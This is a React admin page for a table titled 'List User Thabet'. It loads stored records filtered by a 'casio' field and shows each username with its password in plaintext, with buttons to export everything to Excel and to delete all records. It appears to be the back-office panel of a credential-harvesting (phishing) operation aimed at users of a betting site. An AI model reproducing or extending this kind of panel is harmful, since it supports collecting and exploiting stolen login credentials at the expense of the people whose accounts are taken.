import React, { useEffect, useState } from 'react';
import { Space, Typography, Table, Tag, Button, notification, Popconfirm } from 'antd';
import { ColumnsType } from 'antd/lib/table';
import { deleteAllUser, dowloadFile, getListUserThabet, removeUser } from '../api';
import moment from 'moment';
import { APP_CONFIG } from 'utils/env';

interface DataType {
  _id: string;
  username: string;
  password: string;
  casio: string;
  createdAt: string;
}

const Thabet = () => {
  const [data, setData] = useState<DataType[]>([]);

  useEffect(() => {
    handleGetData();
  }, []);

  const handleGetData = async () => {
    try {
      const res = await getListUserThabet({ casio: 'thabet' });

      if (res) {
        setData(res.data);
      }
    } catch (error) {
      notification.error({ message: 'Lỗi lấy dữ liệu' });
    }
  };

  const handleRemoveUser = async (id: string) => {
    try {
      const res = await removeUser(id);

      notification.success({ message: 'Xoá thành công' });
      handleGetData();
    } catch (error) {
      notification.error({ message: 'Lỗi xoá' });
    }
  };

  const columns: ColumnsType<DataType> = [
    {
      title: 'Username',
      dataIndex: 'username',
      key: 'username',
    },
    {
      title: 'Password',
      dataIndex: 'password',
      key: 'password',
    },
    {
      title: 'Thời gian',
      dataIndex: 'createdAt',
      key: 'createdAt',
      render(value, record, index) {
        return value ? moment(value).format('HH:mm DD/MM/YYYY') : '--';
      },
    },
    {
      title: 'Thao tác',
      key: 'action',
      render: (_, record) => (
        <Space size="middle">
          <Button onClick={() => handleRemoveUser(record._id)} type="primary" danger>
            Xoá
          </Button>
        </Space>
      ),
    },
  ];

  const handleExportFile = async () => {
    const casio = 'thabet';
    try {
      window.open(APP_CONFIG.apiUrl + `/export-to-excel?casio=${casio}`, '_blank');
      // const res = await dowloadFile('thabet');
      notification.success({ message: 'Xuất file thành công' });
    } catch (error) {
      notification.error({ message: 'Lỗi xuất file' });
    }
  };

  const handleDeleteAll = async () => {
    try {
      const res = await deleteAllUser('thabet');
      notification.success({ message: 'Xoá thành công' });
      handleGetData();
    } catch (error) {
      notification.error({ message: 'Lỗi xoá' });
    }
  };

  return (
    <Space className="dashboard full-width" direction="vertical" size={15}>
      <div className="dashboard__wrap">
        <Typography.Title level={3}>List User Thabet</Typography.Title>
        <div className="display-flex-center justify-content-end gap-1">
          <Popconfirm
            title="Bạn có chắc xoá tất cả (Xoá rồi là dev chịu)"
            onConfirm={handleDeleteAll}
            // onCancel={cancel}
            okText="Yes"
            cancelText="No"
          >
            <Button type="primary" danger>
              Delete All
            </Button>
          </Popconfirm>
          <Button onClick={() => handleExportFile()} type="primary">
            Export File
          </Button>
        </div>
        <br />
        <Table columns={columns} dataSource={data} />
      </div>
    </Space>
  );
};

export default Thabet;
